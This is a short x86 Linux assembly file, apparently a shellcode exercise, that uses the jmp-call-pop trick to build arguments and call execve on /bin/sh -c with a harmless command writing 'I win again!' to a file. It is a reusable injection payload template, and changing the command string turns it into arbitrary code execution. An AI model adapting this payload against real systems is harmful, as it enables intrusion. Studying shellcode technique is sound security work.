Section   .text
     global _start

_start:
     jmp short arg3
align 32
shellcode:
     pop esi
     xor eax, eax
     mov byte [esi + 7], al
     lea ebx, [esi]
     mov long [esi + 8], ebx
     mov long [esi + 12], eax
     mov byte al, 0x0b
     mov ebx, esi
     lea ecx, [esp - 4]
     lea edx, [esi + 12]
     int 0x80

align 32
arg0:
     pop esi
     push esi
     mov byte [esi + 2], al
     Call shellcode
     db '/bin/shJAAAAKKKK'
align 32
arg1:
     pop esi
     push esi
     xor eax, eax
     mov byte [esi + 32], al
     Call arg0
     db '-cJ'
align 32
arg3:
     xor eax, eax
     sub long esp, 0x4
     mov long [esp], eax
align 32
arg2:
     Call arg1
     db 'echo "I win again!" > foobar.txtJ'
